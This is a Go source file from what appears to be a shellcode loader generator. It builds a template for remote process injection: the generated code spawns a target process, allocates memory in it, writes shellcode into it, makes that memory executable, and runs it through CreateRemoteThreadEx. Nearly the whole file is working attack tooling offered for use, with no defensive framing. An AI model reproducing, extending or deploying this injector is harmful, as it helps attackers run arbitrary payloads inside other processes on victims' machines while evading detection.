package loaders

import (
	"fmt"
	"strings"
)

type CRTxTemplate struct {
	CRTTemplate
}

func (t CRTxTemplate) Const() string {
	return strings.Replace(t.CRTTemplate.Const(), "CreateRemoteThread", "CreateRemoteThreadEx", 1)
}

func (t CRTxTemplate) Process() string {
	return fmt.Sprintf(`
	/* spawn target process */
    process := loadProcess("__PROCESS__")
    oldProtectCfg := PAGE_READWRITE

    /* allocating the appropriate amount of memory */
    baseAddr, _, _ := VirtualAllocEx.Call(
        uintptr(process.Process),
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )

    /* overwriting process memory with our shellcode */
    _, _, _ = WriteProcessMemory.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        0,
    )

    /* changing permissions for our memory segment */
    _, _, _ = VirtualProtectEx.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )

    /* load remote thread */
	_, _, _ = CreateRemoteThreadEx.Call(
        uintptr(process.Process),
        0,
        0,
        baseAddr,
        0,
        0,
        0,
    )
`)
}

func (t CRTxTemplate) GetTemplate(targetProcess string) string {
	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

__IMPORT__INIT__	

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.CRTTemplate.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.CRTTemplate.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
}
